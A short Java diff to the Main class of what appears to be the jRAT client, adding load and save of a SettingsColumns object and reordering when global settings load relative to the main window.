@@ -20,6 +20,7 @@ import se.jrat.client.addons.PluginLoader;
 import se.jrat.client.commands.DefaultCommands;
 import se.jrat.client.net.WebRequest;
 import se.jrat.client.settings.AbstractStoreable;
+import se.jrat.client.settings.SettingsColumns;
 import se.jrat.client.settings.StatisticsCountry;
 import se.jrat.client.settings.Settings;
 import se.jrat.client.settings.SettingsTheme;
@@ -137,10 +138,11 @@ public class Main {
 
 		StatisticsCountry.getGlobal().load();
 		Settings.getGlobal().load();	
+		SettingsColumns.getGlobal().load();
 		
-		AbstractStoreable.loadAllGlobals();
-
 		instance = new Frame();
+
+		AbstractStoreable.loadAllGlobals();
 
 		boolean showEULA = Settings.getGlobal().getBoolean("showeula");
 		if (!showEULA) {
@@ -185,6 +187,12 @@ public class Main {
 				
 				try {
 					Settings.getGlobal().save();
+				} catch (Exception e) {
+					e.printStackTrace();
+				}
+				
+				try {
+					SettingsColumns.getGlobal().save();
 				} catch (Exception e) {
 					e.printStackTrace();
 				}
